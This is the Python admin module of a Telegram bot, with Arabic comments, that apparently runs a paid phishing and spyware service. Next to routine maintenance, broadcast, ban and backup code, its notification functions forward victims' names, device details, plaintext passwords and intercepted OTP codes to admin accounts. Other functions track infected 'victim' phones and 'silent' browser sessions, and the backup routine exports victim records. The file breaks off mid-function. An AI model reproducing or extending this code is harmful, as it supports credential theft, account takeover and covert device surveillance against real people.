# admin_system.py
# ============================================================
# Admin System v2.1 — الإدارة الكاملة
# ============================================================
# الإضافات:
# 1. وضع الصيانة
# 2. الإشعارات الفورية
# 3. إدارة الجلسات
# 4. إعدادات البوت (ديناميكية)
# 5. إدارة الحظر
# 6. النسخ الاحتياطي
# 7. صحة النظام
# 8. الإحصائيات المتقدمة
# 9. البث الذكي
# 10. إشعار مخصص
# ============================================================

import io
import os
import json
import time
import threading
import subprocess
from datetime import datetime, timedelta
from collections import Counter

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import redis_client, bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("admin_system")


# ══════════════════════════════════════════════════════════════
# [1] Redis Keys
# ══════════════════════════════════════════════════════════════
KEY_MAINTENANCE = "system:maintenance"
KEY_MAINTENANCE_MSG = "system:maintenance_msg"
KEY_MAINTENANCE_STARTED = "system:maintenance_started"
KEY_MAINTENANCE_ENDS = "system:maintenance_ends"
KEY_MAINTENANCE_EXEMPT = "system:maintenance_exempt"
KEY_START_TIME = "system:start_time"
KEY_ONLINE_USERS = "system:online_users"
KEY_BOT_SETTINGS = "system:bot_settings"
KEY_TOOL_PRICES = "tool_prices"


# ══════════════════════════════════════════════════════════════
# [2] Live User Tracking
# ══════════════════════════════════════════════════════════════
def track_user_activity(user_id, action, extra=None):
    if not redis_client:
        return
    try:
        now = time.time()
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        data = {
            "action": action,
            "extra": extra or {},
            "timestamp": now,
            "time_str": now_str
        }

        redis_client.setex(
            f"user_activity:{user_id}:last",
            3600,
            json.dumps(data, ensure_ascii=False)
        )

        redis_client.lpush(
            f"user_activity:{user_id}:log",
            json.dumps(data, ensure_ascii=False)
        )
        redis_client.ltrim(f"user_activity:{user_id}:log", 0, 99)
        redis_client.expire(f"user_activity:{user_id}:log", 86400 * 7)

        redis_client.zadd(KEY_ONLINE_USERS, {str(user_id): now})
        cutoff = now - 300
        redis_client.zremrangebyscore(KEY_ONLINE_USERS, 0, cutoff)
        redis_client.expire(KEY_ONLINE_USERS, 3600)

        redis_client.lpush(
            "system:activity_log",
            json.dumps({
                "user_id": user_id,
                "action": action,
                "extra": extra or {},
                "timestamp": now,
                "time_str": now_str
            }, ensure_ascii=False)
        )
        redis_client.ltrim("system:activity_log", 0, 499)
        redis_client.expire("system:activity_log", 86400 * 7)

        today = datetime.utcnow().strftime("%Y-%m-%d")
        redis_client.hincrby(f"system:tool_usage:{today}", action, 1)
        redis_client.expire(f"system:tool_usage:{today}", 86400 * 30)

    except Exception as e:
        logger.debug(f"track_user_activity error: {e}")


def get_user_activity(user_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"user_activity:{user_id}:last")
        if raw:
            return json.loads(raw)
    except Exception:
        pass
    return None


def get_user_activity_log(user_id, limit=20):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange(f"user_activity:{user_id}:log", 0, limit - 1) or []
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


def get_online_users():
    if not redis_client:
        return []
    try:
        now = time.time()
        cutoff = now - 300
        online = redis_client.zrangebyscore(KEY_ONLINE_USERS, cutoff, now)
        return [(int(uid), redis_client.zscore(KEY_ONLINE_USERS, uid)) for uid in online]
    except Exception:
        return []


def get_online_count():
    return len(get_online_users())


def is_user_online(user_id):
    if not redis_client:
        return False
    try:
        score = redis_client.zscore(KEY_ONLINE_USERS, str(user_id))
        if score:
            return (time.time() - float(score)) < 300
    except Exception:
        pass
    return False


# ══════════════════════════════════════════════════════════════
# [3] ★★★ MAINTENANCE MODE ★★★
# ══════════════════════════════════════════════════════════════
def is_maintenance():
    if not redis_client:
        return False
    try:
        return bool(redis_client.get(KEY_MAINTENANCE))
    except Exception:
        return False


def enable_maintenance(custom_msg=None, admin_id=None, duration_minutes=0, exempt_mode="all"):
    if not redis_client:
        return False
    try:
        pipe = redis_client.pipeline()
        pipe.set(KEY_MAINTENANCE, "1")
        pipe.set(KEY_MAINTENANCE_STARTED, str(time.time()))
        pipe.set(KEY_MAINTENANCE_EXEMPT, exempt_mode)

        if custom_msg:
            pipe.set(KEY_MAINTENANCE_MSG, custom_msg)
        else:
            default_msg = (
                "🔧 <b>وضع الصيانة</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "عذراً، البوت حالياً في وضع الصيانة\n"
                "لتحديثات وتحسينات مهمة\n\n"
                "⏱️ سيتم إعادة تشغيل البوت في أقرب وقت\n"
                "شكراً لصبركم 🙏"
            )
            pipe.set(KEY_MAINTENANCE_MSG, default_msg)

        if duration_minutes > 0:
            ends_at = time.time() + (duration_minutes * 60)
            pipe.set(KEY_MAINTENANCE_ENDS, str(ends_at))
            _schedule_maintenance_end(duration_minutes)

        pipe.execute()

        metrics.inc_counter("maintenance_enabled")
        logger.warning(f"[MAINTENANCE] Enabled by {admin_id} | duration={duration_minutes}min | exempt={exempt_mode}")

        if admin_id:
            try:
                notify_active_users(custom_msg or "البوت في وضع الصيانة")
            except Exception:
                pass

        return True
    except Exception as e:
        logger.exception(f"enable_maintenance error: {e}")
        return False


def _schedule_maintenance_end(minutes):
    def _end():
        time.sleep(minutes * 60)
        disable_maintenance(admin_id=0)
        logger.info(f"[MAINTENANCE] Auto-ended after {minutes}min")

    thread = threading.Thread(target=_end, daemon=True)
    thread.start()


def disable_maintenance(admin_id=None):
    if not redis_client:
        return False
    try:
        pipe = redis_client.pipeline()
        pipe.delete(KEY_MAINTENANCE)
        pipe.delete(KEY_MAINTENANCE_STARTED)
        pipe.delete(KEY_MAINTENANCE_ENDS)
        pipe.delete(KEY_MAINTENANCE_EXEMPT)
        pipe.execute()

        metrics.inc_counter("maintenance_disabled")
        logger.info(f"[MAINTENANCE] Disabled by {admin_id}")

        try:
            notify_active_users("✅ البوت اشتغل تاني!")
        except Exception:
            pass

        return True
    except Exception as e:
        logger.exception(f"disable_maintenance error: {e}")
        return False


def get_maintenance_message():
    if not redis_client:
        return None
    try:
        return redis_client.get(KEY_MAINTENANCE_MSG)
    except Exception:
        return None


def set_maintenance_message(message, admin_id=None):
    if not redis_client:
        return False
    try:
        redis_client.set(KEY_MAINTENANCE_MSG, message)
        logger.info(f"[MAINTENANCE] Message updated by {admin_id}")
        return True
    except Exception:
        return False


def get_maintenance_duration():
    if not redis_client:
        return 0
    try:
        started = redis_client.get(KEY_MAINTENANCE_STARTED)
        if started:
            return int(time.time() - float(started))
    except Exception:
        pass
    return 0


def get_maintenance_remaining():
    if not redis_client:
        return 0
    try:
        ends = redis_client.get(KEY_MAINTENANCE_ENDS)
        if ends:
            remaining = float(ends) - time.time()
            return max(0, int(remaining))
    except Exception:
        pass
    return 0


def get_maintenance_exempt():
    if not redis_client:
        return "all"
    try:
        mode = redis_client.get(KEY_MAINTENANCE_EXEMPT)
        return mode if mode else "all"
    except Exception:
        return "all"


def is_exempt_from_maintenance(user_id):
    if not is_maintenance():
        return True

    mode = get_maintenance_exempt()

    if mode == "none":
        return False

    if mode == "admin_only" or mode == "vip":
        try:
            from points_system import is_admin, is_vip
            if is_admin(user_id):
                return True
            if mode == "vip" and is_vip(user_id):
                return True
        except Exception:
            pass
        return False

    return False


# ══════════════════════════════════════════════════════════════
# [4] NOTIFICATIONS
# ══════════════════════════════════════════════════════════════
def notify_admin(admin_ids, title, body, icon="🔔"):
    if not bot:
        return False
    try:
        text = (
            f"{icon} <b>{title}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{body}\n\n"
            f"🕐 <code>{datetime.now().strftime('%H:%M:%S')}</code>"
        )
        for admin_id in admin_ids:
            try:
                bot.send_message(admin_id, text, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                continue
        return True
    except Exception as e:
        logger.warning(f"notify_admin error: {e}")
        return False


def get_admin_ids():
    try:
        from points_system import ADMIN_IDS
        return ADMIN_IDS
    except Exception:
        return [7631249810]


def notify_new_victim(victim_name, victim_id, chat_id, device_info=None):
    body = (
        f"👤 <b>الاسم:</b> <code>{victim_name}</code>\n"
        f"🆔 <b>ID:</b> <code>{victim_id[:16]}</code>\n"
        f"💬 <b>Chat:</b> <code>{chat_id}</code>"
    )
    if device_info:
        body += f"\n📱 <b>الجهاز:</b> <code>{device_info}</code>"

    notify_admin(get_admin_ids(), "ضحية جديدة اتصلت", body, "🎯")


def notify_new_session(session_id, site, ip=None):
    body = (
        f"🆔 <b>Session:</b> <code>{session_id[:16]}</code>\n"
        f"🌐 <b>الموقع:</b> <code>{site}</code>"
    )
    if ip:
        body += f"\n📍 <b>IP:</b> <code>{ip}</code>"

    notify_admin(get_admin_ids(), "جلسة جديدة فتحت", body, "🆕")


def notify_new_password(platform, username, password, ip=None):
    body = (
        f"📧 <b>Platform:</b> <code>{platform}</code>\n"
        f"👤 <b>User:</b> <code>{username}</code>\n"
        f"🔑 <b>Pass:</b> <code>{password}</code>"
    )
    if ip:
        body += f"\n📍 <b>IP:</b> <code>{ip}</code>"

    notify_admin(get_admin_ids(), "كلمة سر جديدة", body, "🔐")


def notify_new_otp(phone, otp, service=None):
    body = (
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🔢 <b>OTP:</b> <code>{otp}</code>"
    )
    if service:
        body += f"\n🏢 <b>Service:</b> <code>{service}</code>"

    notify_admin(get_admin_ids(), "OTP جديد", body, "🔢")


def notify_critical_error(error_msg, module=None):
    body = f"⚠️ <b>Module:</b> <code>{module or 'Unknown'}</code>\n"
    body += f"❌ <b>Error:</b>\n<pre>{error_msg[:500]}</pre>"

    notify_admin(get_admin_ids(), "خطأ حرج في النظام", body, "🚨")


def notify_active_users(message):
    if not bot or not redis_client:
        return 0
    try:
        now = time.time()
        cutoff = now - 300
        online = redis_client.zrangebyscore(KEY_ONLINE_USERS, cutoff, now) or []

        sent = 0
        for uid in online[:500]:
            try:
                bot.send_message(int(uid), message, parse_mode="HTML")
                sent += 1
                time.sleep(0.05)
            except Exception:
                continue

        logger.info(f"[NOTIFY] Sent to {sent} active users")
        return sent
    except Exception as e:
        logger.warning(f"notify_active_users error: {e}")
        return 0


# ══════════════════════════════════════════════════════════════
# [5] SESSION MANAGEMENT
# ══════════════════════════════════════════════════════════════
def get_active_sessions():
    if not redis_client:
        return []
    try:
        sessions = []

        for key in redis_client.scan_iter(match="silent:*", count=100):
            if isinstance(key, bytes):
                key = key.decode()
            raw = redis_client.get(key)
            if raw:
                try:
                    data = json.loads(raw)
                    sessions.append({
                        "type": "silent",
                        "session_id": data.get("session_id", key.split(":")[-1]),
                        "chat_id": data.get("chat_id"),
                        "label": data.get("label", ""),
                        "created_at": data.get("created_at", 0),
                        "accessed": data.get("accessed", False),
                        "collected": data.get("collected", False),
                        "key": key
                    })
                except Exception:
                    continue

        for key in redis_client.scan_iter(match="se_session:*", count=100):
            if isinstance(key, bytes):
                key = key.decode()
            raw = redis_client.get(key)
            if raw:
                try:
                    data = json.loads(raw)
                    sessions.append({
                        "type": data.get("type", "unknown"),
                        "session_id": data.get("session_id", key.split(":")[-1]),
                        "chat_id": data.get("chat_id"),
                        "template": data.get("template", ""),
                        "label": data.get("label", ""),
                        "created_at": data.get("created_at", 0),
                        "accessed": data.get("accessed", False),
                        "collected": data.get("collected", False),
                        "key": key
                    })
                except Exception:
                    continue

        for key in redis_client.scan_iter(match="victim:*:*", count=100):
            if isinstance(key, bytes):
                key = key.decode()
            try:
                data = redis_client.hgetall(key)
                if data:
                    sessions.append({
                        "type": "apk",
                        "session_id": data.get("victim_id", key.split(":")[-1]),
                        "chat_id": data.get("chat_id"),
                        "label": data.get("name", ""),
                        "created_at": float(data.get("created_at", 0)),
                        "accessed": data.get("status") == "active",
                        "collected": True,
                        "key": key
                    })
            except Exception:
                continue

        sessions.sort(key=lambda x: x.get("created_at", 0), reverse=True)
        return sessions[:100]
    except Exception as e:
        logger.warning(f"get_active_sessions error: {e}")
        return []


def get_online_devices():
    if not redis_client:
        return []
    try:
        now = time.time()
        cutoff = now - 300
        devices = []

        for key in redis_client.scan_iter(match="victim:*:*", count=100):
            if isinstance(key, bytes):
                key = key.decode()
            try:
                data = redis_client.hgetall(key)
                last_seen = float(data.get("last_seen", 0))
                if now - last_seen < 300 and data.get("status") == "active":
                    devices.append({
                        "type": "apk",
                        "victim_id": data.get("victim_id", "?"),
                        "name": data.get("name", "?"),
                        "device_id": data.get("device_id", "")[:16],
                        "model": data.get("model", "?"),
                        "brand": data.get("brand", "?"),
                        "last_seen": last_seen,
                        "chat_id": data.get("chat_id")
                    })
            except Exception:
                continue

        for key in redis_client.scan_iter(match="silent:*", count=100):
            if isinstance(key, bytes):
                key = key.decode()
            raw = redis_client.get(key)
            if raw:
                try:
                    data = json.loads(raw)
                    accessed_at = data.get("accessed_at", 0)
                    if accessed_at and now - accessed_at < 300:
                        devices.append({
                            "type": "silent",
                            "victim_id": data.get("session_id", "?"),
                            "name": data.get("label", "Silent"),
                            "device_id": "",
                            "model": "Browser",
                            "brand": data.get("accessed_ip", "?"),
                            "last_seen": accessed_at,
                            "chat_id": data.get("chat_id")
                        })
                except Exception:
                    continue

        devices.sort(key=lambda x: x.get("last_seen", 0), reverse=True)
        return devices
    except Exception as e:
        logger.warning(f"get_online_devices error: {e}")
        return []


def kill_session(session_key):
    if not redis_client:
        return False
    try:
        redis_client.delete(session_key)

        if session_key.startswith("silent:"):
            session_id = session_key.replace("silent:", "")
            redis_client.delete(f"silent_data:{session_id}")
            redis_client.delete(f"silent_autofill:{session_id}")

        logger.info(f"[SESSION] Killed: {session_key}")
        return True
    except Exception as e:
        logger.warning(f"kill_session error: {e}")
        return False


# ══════════════════════════════════════════════════════════════
# [6] ★★★ BOT SETTINGS (ديناميكية) ★★★
# ══════════════════════════════════════════════════════════════
def get_bot_setting(key, default=None):
    if not redis_client:
        return default
    try:
        val = redis_client.hget(KEY_BOT_SETTINGS, key)
        if val:
            return val.decode() if isinstance(val, bytes) else val
        return default
    except Exception:
        return default


def set_bot_setting(key, value):
    if not redis_client:
        return False
    try:
        redis_client.hset(KEY_BOT_SETTINGS, key, str(value))
        logger.info(f"[SETTINGS] {key} = {str(value)[:50]}")
        return True
    except Exception as e:
        logger.warning(f"set_bot_setting error: {e}")
        return False


def get_all_settings():
    """يرجع كل الإعدادات (مع أسعار مخصصة)"""
    if not redis_client:
        return {}
    try:
        # ★ الإعدادات المحفوظة ★
        raw = redis_client.hgetall(KEY_BOT_SETTINGS) or {}
        settings = {
            (k.decode() if isinstance(k, bytes) else k):
            (v.decode() if isinstance(v, bytes) else v)
            for k, v in raw.items()
        }

        # ★ أسعار مخصصة ★
        prices = redis_client.hgetall(KEY_TOOL_PRICES) or {}
        settings["__custom_prices__"] = {
            (k.decode() if isinstance(k, bytes) else k):
            int(v.decode() if isinstance(v, bytes) else v)
            for k, v in prices.items()
        }

        return settings
    except Exception as e:
        logger.warning(f"get_all_settings error: {e}")
        return {}


def set_tool_price(tool_key, points):
    """تعديل سعر أداة — يشتغل فوراً"""
    if not redis_client:
        return False
    try:
        redis_client.hset(KEY_TOOL_PRICES, tool_key, int(points))
        logger.info(f"[SETTINGS] Tool {tool_key} price = {points}")

        # ★ حدّث cache لو موجود ★
        try:
            redis_client.delete(f"tool_price:{tool_key}")
        except Exception:
            pass

        return True
    except Exception as e:
        logger.warning(f"set_tool_price error: {e}")
        return False


def get_tool_price(tool_key, default_price=0):
    """يقرأ سعر أداة — ديناميكي من Redis أولاً"""
    if not redis_client:
        return default_price
    try:
        val = redis_client.hget(KEY_TOOL_PRICES, tool_key)
        if val is not None:
            if isinstance(val, bytes):
                val = val.decode()
            return int(val)
    except Exception:
        pass
    return default_price


def get_tool_prices():
    """يرجع كل الأسعار المخصصة"""
    if not redis_client:
        return {}
    try:
        raw = redis_client.hgetall(KEY_TOOL_PRICES) or {}
        return {
            (k.decode() if isinstance(k, bytes) else k):
            int(v.decode() if isinstance(v, bytes) else v)
            for k, v in raw.items()
        }
    except Exception:
        return {}


def reset_tool_prices():
    """حذف كل الأسعار المخصصة (الرجوع للافتراضية)"""
    if not redis_client:
        return False
    try:
        redis_client.delete(KEY_TOOL_PRICES)
        logger.info("[SETTINGS] All custom tool prices reset")
        return True
    except Exception as e:
        logger.warning(f"reset_tool_prices error: {e}")
        return False


def get_welcome_points_dynamic(default=25):
    """نقاط الترحيب الديناميكية"""
    val = get_bot_setting("welcome_points", None)
    if val is not None:
        try:
            return int(val)
        except Exception:
            pass
    return default


def get_referral_points_dynamic(default=10):
    """نقاط الإحالة الديناميكية"""
    val = get_bot_setting("ref_points", None)
    if val is not None:
        try:
            return int(val)
        except Exception:
            pass
    return default


# ══════════════════════════════════════════════════════════════
# [7] BAN MANAGEMENT
# ══════════════════════════════════════════════════════════════
KEY_BAN_LIST = "system:banned_users"
KEY_IP_BAN_LIST = "system:banned_ips"


def ban_user_permanent(user_id, reason=""):
    if not redis_client:
        return False
    try:
        redis_client.sadd(KEY_BAN_LIST, str(user_id))
        redis_client.hset(f"ban_reason:{user_id}", "reason", reason)
        redis_client.hset(f"ban_reason:{user_id}", "timestamp", time.time())
        logger.info(f"[BAN] User {user_id} banned | {reason}")
        return True
    except Exception:
        return False


def unban_user(user_id):
    if not redis_client:
        return False
    try:
        redis_client.srem(KEY_BAN_LIST, str(user_id))
        redis_client.delete(f"ban_reason:{user_id}")
        logger.info(f"[BAN] User {user_id} unbanned")
        return True
    except Exception:
        return False


def unban_all():
    if not redis_client:
        return 0
    try:
        count = redis_client.scard(KEY_BAN_LIST) or 0
        redis_client.delete(KEY_BAN_LIST)
        logger.info(f"[BAN] Unbanned all ({count} users)")
        return count
    except Exception:
        return 0


def get_banned_users():
    if not redis_client:
        return []
    try:
        banned = redis_client.smembers(KEY_BAN_LIST) or set()
        result = []
        for uid in banned:
            uid_str = uid.decode() if isinstance(uid, bytes) else uid
            reason = redis_client.hget(f"ban_reason:{uid_str}", "reason") or ""
            ts = redis_client.hget(f"ban_reason:{uid_str}", "timestamp") or "0"
            result.append({
                "user_id": uid_str,
                "reason": reason.decode() if isinstance(reason, bytes) else reason,
                "timestamp": float(ts) if ts else 0
            })
        return result
    except Exception:
        return []


def ban_ip(ip_address, reason=""):
    if not redis_client:
        return False
    try:
        redis_client.sadd(KEY_IP_BAN_LIST, ip_address)
        logger.info(f"[BAN] IP {ip_address} banned")
        return True
    except Exception:
        return False


def unban_ip(ip_address):
    if not redis_client:
        return False
    try:
        redis_client.srem(KEY_IP_BAN_LIST, ip_address)
        return True
    except Exception:
        return False


def is_ip_banned(ip_address):
    if not redis_client:
        return False
    try:
        return bool(redis_client.sismember(KEY_IP_BAN_LIST, ip_address))
    except Exception:
        return False


def get_banned_ips():
    if not redis_client:
        return []
    try:
        ips = redis_client.smembers(KEY_IP_BAN_LIST) or set()
        return [ip.decode() if isinstance(ip, bytes) else ip for ip in ips]
    except Exception:
        return []


# ══════════════════════════════════════════════════════════════
# [8] BACKUP MANAGEMENT
# ══════════════════════════════════════════════════════════════
def backup_redis_to_json():
    if not redis_client:
        return None
    try:
        backup = {
            "timestamp": time.time(),
            "datetime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "keys": {}
        }

        patterns = [
            "user:*", "victims:*", "victim:*:*", "silent:*",
            "se_session:*", "profile:*", "apk_code:*",
            "wa_report:*", "admin_events", "system:*", "tool_prices"
        ]

        total = 0
        for pattern in patterns:
            for key in redis_client.scan_iter(match=pattern, count=100):
                if isinstance(key, bytes):
                    key = key.decode()
                try:
                    ktype = redis_client.type(key)
                    if isinstance(ktype, bytes):
                        ktype = ktype.decode()

                    if ktype == "string":
                        val = redis_client.get(key)
                        if isinstance(val, bytes):
                            val = val.decode('utf-8', errors='ignore')
                        backup["keys"][key] = {"type": "string", "value": val}
                    elif ktype == "list":
                        vals = redis_client.lrange(key, 0, -1)
                        backup["keys"][key] = {
                            "type": "list",
                            "value": [
                                v.decode('utf-8', errors='ignore') if isinstance(v, bytes) else v
                                for v in vals
                            ]
                        }
                    elif ktype == "set":
                        vals = redis_client.smembers(key)
                        backup["keys"][key] = {
                            "type": "set",
                            "value": [
                                v.decode('utf-8', errors='ignore') if isinstance(v, bytes) else v
                                for v in vals
                            ]
                        }
                    elif ktype == "hash":
                        vals = redis_client.hgetall(key)
                        backup["keys"][key] = {
                            "type": "hash",
                            "value": {
                                (k.decode() if isinstance(k, bytes) else k):
                                (v.decode('utf-8', errors='ignore') if isinstance(v, bytes) else v)
                                for k, v in vals.items()
                            }
                        }
                    elif ktype == "zset":
                        vals = redis_client.zrange(key, 0, -1, withscores=True)
                        backup["keys"][key] = {
                            "type": "zset",
                            "value": [
                                [
                                    v[0].decode('utf-8', errors='ignore') if isinstance(v[0], bytes) else v[0],
                                    v[1]
                                ]
                                for v in vals
                            ]
                        }
                    total += 1
                except Exception:
                    continue

        backup["total_keys"] = total
        logger.info(f"[BACKUP] Redis backup created | {total} keys")
        return backup
    except Exception as e:
        logger.exception(f"backup_redis_to_json error: {e}")
        return None


def restore_redis_from_json(backup_data):
    if not redis_client:
        return False
    try:
        keys_data = backup_data.get("keys", {})
        total = 0

        for key, kdata in keys_data.items():
            try:
                ktype = kdata.get("type")
                value = kdata.get("value")

                if ktype == "string":
                    redis_client.set(key, value)
                elif ktype == "list":
                    redis_client.delete(key)
                    if value:
                        redis_client.rpush(key, *value)
                elif ktype == "set":
                    redis_client.delete(key)
                    if value:
                        redis_client.sadd(key, *value)
                elif ktype == "hash":
                    redis_client.delete(key)
                    if value:
                        redis_client.hset(key, mapping=value)
                elif ktype == "zset":
                    redis_client.delete(key)
                    if value:
                        redis_client.zadd(key, {v[0]: float(v[1]) for v in value})
                total += 1
            except Exception:
                continue

        logger.info(f"[BACKUP] Redis restored | {total} keys")
        return True
    except Exception as e:
        logger.exception(f"restore_redis_from_json error: {e}")
        return False


# ══════════════════════════════════════════════════════════════
# [9] SYSTEM HEALTH
# ══════════════════════════════════════════════════════════════
def get_system_health():
    health = {
        "cpu_percent": 0,
        "ram_percent": 0,
        "disk_percent": 0,
        "redis": False,
        "postgres": False,
        "webhook": False,
        "redis_latency_ms": 0,
        "requests_per_sec": 0,
        "uptime_seconds": 0,
        "timestamp": time.time()
    }

    try:
        import psutil
        health["cpu_percent"] = psutil.cpu_percent(interval=0.1)
        health["ram_percent"] = psutil.virtual_memory().percent
        health["disk_percent"] = psutil.disk_usage('/').percent
    except Exception:
        pass

    try:
        if redis_client:
            start = time.time()
            redis_client.ping()
            health["redis"] = True
            health["redis_latency_ms"] = round((time.time() - start) * 1000, 2)
    except Exception:
        pass

    try:
        from database import get_db
        with get_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT 1")
            health["postgres"] = True
    except Exception:
        pass

    try:
        if bot:
            info = bot.get_webhook_info()
            health["webhook"] = bool(info.url)
    except Exception:
        pass

    try:
        if redis_client:
            start = redis_client.get(KEY_START_TIME)
            if start:
                health["uptime_seconds"] = int(time.time() - float(start))
    except Exception:
        pass

    try:
        from monitoring import metrics
        snap = metrics.snapshot()
        counters = snap.get("counters", {})
        total_requests = sum(
            v for k, v in counters.items() if "request" in k.lower()
        )
        uptime = max(health["uptime_seconds"], 1)
        health["requests_per_sec"] = round(total_requests / uptime, 2)
    except Exception:
        pass

    return health


# ══════════════════════════════════════════════════════════════
# [10] ADVANCED ANALYTICS
# ══════════════════════════════════════════════════════════════
def get_tool_usage_today():
    if not redis_client:
        return {}
    try:
        today = datetime.utcnow().strftime("%Y-%m-%d")
        usage = redis_client.hgetall(f"system:tool_usage:{today}") or {}
        return {
            (k.decode() if isinstance(k, bytes) else k):
            int(v.decode() if isinstance(v, bytes) else v)
            for k, v in usage.items()
        }
    except Exception:
        return {}


def get_users_growth(days=7):
    if not redis_client:
        return {}
    try:
        result = {}
        for i in range(days):
            date = (datetime.utcnow() - timedelta(days=i)).strftime("%Y-%m-%d")
            count = redis_client.get(f"stats:new_users:{date}") or 0
            result[date] = int(count)
        return result
    except Exception:
        return {}


def get_top_users(limit=10, period="day"):
    if not redis_client:
        return []
    try:
        users = redis_client.smembers("all_users") or set()
        counter = Counter()
        cutoff = time.time() - (86400 if period == "day" else 604800)

        for uid in users:
            try:
                log_count = redis_client.llen(f"user_activity:{uid}:log") or 0
                last_raw = redis_client.get(f"user_activity:{uid}:last")
                if last_raw:
                    last = json.loads(last_raw)
                    last_ts = last.get("timestamp", 0)
                else:
                    last_ts = 0
                if last_ts > cutoff:
                    counter[uid] = log_count
            except Exception:
                continue
        return counter.most_common(limit)
    except Exception as e:
        logger.exception(f"get_top_users error: {e}")
        return []


def get_conversion_stats():
    if not redis_client:
        return {"total": 0, "free": 0, "paid": 0, "rate": 0}
    try:
        users = redis_client.smembers("all_users") or set()
        total = len(users)
        paid = 0
        free = 0

        for uid in users:
            try:
                raw = redis_client.get(f"user:{uid}")
                if not raw:
                    continue
                u = json.loads(raw)
                has_sub = False
                if u.get("subscription"):
                    try:
                        expires = datetime.fromisoformat(u["subscription"]["expires_at"])
                        if expires > datetime.utcnow():
                            has_sub = True
                    except Exception:
                        pass
                if u.get("is_vip") or has_sub:
                    paid += 1
                else:
                    free += 1
            except Exception:
                continue

        rate = (paid / total * 100) if total > 0 else 0
        return {
            "total": total,
            "free": free,
            "paid": paid,
            "rate": round(rate, 1)
        }
    except Exception as e:
        logger.exception(f"get_conversion_stats error: {e}")
        return {"total": 0, "free": 0, "paid": 0, "rate": 0}


def get_recent_activity(limit=30):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange("system:activity_log", 0, limit - 1) or []
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


# ══════════════════════════════════════════════════════════════
# [11] SMART BROADCAST
# ══════════════════════════════════════════════════════════════
def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedule_at=None):
    if not redis_client:
        return 0

    def _do_broadcast():
        try:
            recipients = []
            if group == "all":
                recipients = [int(u) for u in (redis_client.smembers("all_users") or set()) if str(u).isdigit()]
            elif group == "vip":
                from points_system import get_all_users
                users = get_all_users()
                recipients = [u["user_id"] for u in users if u.get("is_vip")]
            elif group == "active":
                now = time.time()
                cutoff = now - 86400
                online = redis_client.zrangebyscore(KEY_ONLINE_USERS, cutoff, now)
                recipients = [int(u) for u in online if str(u).isdigit()]
            elif group == "banned":
                recipients = [int(u) for u in (redis_client.smembers(KEY_BAN_LIST) or set()) if str(u).isdigit()]
            elif isinstance(group, list):
                recipients = group

            markup = None
            if with_buttons:
                markup = InlineKeyboardMarkup()
                for btn in with_buttons:
                    if isinstance(btn, tuple) and len(btn) >= 2:
                        markup.add(InlineKeyboardButton(btn[0], callback_data=btn[1]))

            sent = 0
            failed = 0
            for uid in recipients:
                try:
                    bot.send_message(
                        uid, message,
                        parse_mode="HTML",
                        reply_markup=markup,
                        disable_web_page_preview=True
                    )
                    sent += 1
                    time.sleep(0.06)
                except Exception:
                    failed += 1
                    continue

            logger.info(f"[BROADCAST] group={group} | sent={sent} | failed={failed}")

            if admin_id:
                try:
                    bot.send_message(
                        admin_id,
                        f"📢 <b>البث اكتمل</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 <b>المجموعة:</b> <code>{group}</code>\n"
                        f"✅ <b>نجح:</b> <code>{sent}</code>\n"
                        f"❌ <b>فشل:</b> <code>{failed}</code>",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            return sent
        except Exception as e:
            logger.exception(f"broadcast error: {e}")
            return 0

    if schedule_at and schedule_at > time.time():
        delay = schedule_at - time.time()
        def _scheduled():
            time.sleep(delay)
            _do_broadcast()
        threading.Thread(target=_scheduled, daemon=True).start()
        logger.info(f"[BROADCAST] Scheduled in {int(delay)}s")
        return -1

    threading.Thread(target=_do_broadcast, daemon=True).start()
    return 0


# ══════════════════════════════════════════════════════════════
# [12] CUSTOM NOTIFICATION
# ══════════════════════════════════════════════════════════════
def send_custom_notification(user_ids, message, with_buttons=None, admin_id=None):
    if not redis_client or not bot:
        return 0

    if isinstance(user_ids, int):
        user_ids = [user_ids]
    elif isinstance(user_ids, str):
        user_ids = [int(x.strip()) for x in user_ids.split(",") if x.strip().isdigit()]

    markup = None
    if with_buttons:
        markup = InlineKeyboardMarkup()
        for btn in with_buttons:
            if isinstance(btn, tuple) and len(btn) >= 2:
                markup.add(InlineKeyboardButton(btn[0], callback_data=btn[1]))

    sent = 0
    failed = 0
    for uid in user_ids:
        try:
            bot.send_message(
                uid, message,
                parse_mode="HTML",
                reply_markup=markup,
                disable_web_page_preview=True
            )
            sent += 1
            time.sleep(0.06)
        except Exception:
            failed += 1
            continue

    logger.info(f"[CUSTOM-NOTIFY] sent={sent} | failed={failed}")

    if admin_id:
        try:
            bot.send_message(
                admin_id,
                f"✉️ <b>الإشعار اكتمل</b>\n"
                f"✅ <b>نجح:</b> <code>{sent}</code>\n"
                f"❌ <b>فشل:</b> <code>{failed}</code>",
                parse_mode="HTML"
            )
        except Exception:
            pass

    return sent


# ══════════════════════════════════════════════════════════════
# [13] Reports & Text Builders
# ══════════════════════════════════════════════════════════════
def build_maintenance_status_text():
    if not is_maintenance():
        return (
            "🔧 <b>وضع الصيانة</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ <b>الحالة:</b> معطّل\n\n"
            "💡 يمكنك تفعيل وضع الصيانة لإيقاف البوت\n"
            "مؤقتاً أثناء التحديثات"
        )

    duration = get_maintenance_duration()
    remaining = get_maintenance_remaining()
    exempt = get_maintenance_exempt()
    msg = get_maintenance_message() or ""

    exempt_text = {
        "all": "لا أحد",
        "admin_only": "الأدمن فقط",
